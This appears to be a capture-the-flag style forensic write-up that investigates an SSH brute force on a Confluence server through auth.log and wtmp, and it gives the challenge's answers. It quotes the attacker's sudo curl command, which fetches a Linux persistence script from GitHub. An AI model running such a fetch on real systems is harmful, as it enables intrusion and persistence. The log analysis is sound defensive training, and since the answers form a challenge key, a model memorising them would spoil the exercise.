# Scenario
You will familiarize yourself with Unix auth.log and wtmp logs. We'll explore a scenario where a Confluence server was brute-forced via its SSH service. After gaining access to the server, the attacker performed additional activities, which we can track using auth.log. Although auth.log is primarily used for brute-force analysis, we will delve into the full potential of this artifact in our investigation, including aspects of privilege escalation, persistence, and even some visibility into command execution.

Log files: [Brutus.zip](https://github.com/user-attachments/files/16104805/Brutus.zip) pass: hacktheblue

# Goal
The goal is to analyze the auth.log and the wtmp log files and answer the following questions as part of the incident response.

# Response
### Analyzing the auth.log, can you identify the IP address used by the attacker to carry out a brute force attack?
It appears that the IP 65.2.161.68 continuously keeps failing to authenticate. These logs show someone trying to log in as admin, and the system saying that there is no user admin. These failed login run from 06:31:33 to 06:31:42, suggesting a brute force tool or script is running, as a user at the keyboard could not type that fast:
![image](https://github.com/marufrahmangit/hack-the-box/assets/25085219/9de73f1f-2085-4d7c-8c9b-5e7dce21dc89)

### The brute force attempts were successful, and the attacker gained access to an account on the server. What is the username of this account?
Successful authentication as the user `root` at 06:32:44:
![image](https://github.com/marufrahmangit/hack-the-box/assets/25085219/d93da765-46b4-40d2-8fb7-57972efc20b1)

### Can you identify the timestamp when the attacker manually logged in to the server to carry out their objectives?
2024-03-06 06:32:45

### SSH login sessions are tracked and assigned a session number upon login. What is the session number assigned to the attacker's session for the user account from Question 2?
37
![image](https://github.com/marufrahmangit/hack-the-box/assets/25085219/c543c85a-d4a6-465d-bbcc-c7d64c4478bc)

### The attacker added a new user as part of their persistence strategy on the server and gave this new user account higher privileges. What is the name of this account?
cyberjunkie.
![image](https://github.com/marufrahmangit/hack-the-box/assets/25085219/1531bc2f-6cad-4d58-af23-677b6c24ce55)

### What is the MITRE ATT&CK sub-technique ID used for persistence?
[T1136.001](https://attack.mitre.org/techniques/T1136/001/)

![image](https://github.com/marufrahmangit/hack-the-box/assets/25085219/78b15345-d619-4edb-b589-fb27cd95a572)

### How long did the attacker's first SSH session last based on the previously confirmed authentication time and session ending within the auth.log? (seconds)
Total time of the session is 06:32:45 - 06:37:24, so, 279 seconds

### The attacker logged into their backdoor account and utilized their higher privileges to download a script. What is the full command executed using sudo?
/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
![image](https://github.com/marufrahmangit/hack-the-box/assets/25085219/2265c87d-7012-445c-a50f-c3169a048d31)
